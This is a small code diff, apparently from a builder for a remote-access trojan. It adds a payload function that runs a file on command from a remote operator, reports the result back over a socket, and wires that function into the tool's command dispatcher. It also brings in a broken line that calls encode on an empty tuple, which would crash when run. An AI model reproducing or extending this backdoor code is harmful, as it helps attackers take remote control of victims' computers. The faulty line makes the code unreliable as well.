@@ -13,7 +13,8 @@ def main(option):
         config.functions.append('''
 def exec_f(file):
     startfile(file.split(' ',1)[1])
-    s.sendall(('[+]Executed : ' + file.split(' ',1)[1]).encode())''')
+    s.sendall(().encode())
+    main_send('[+]Executed : ' + file.split(' ',1)[1], s)''')
         config.logics.append('''
             elif command == "exec_f":
                 exec_f(data)''')
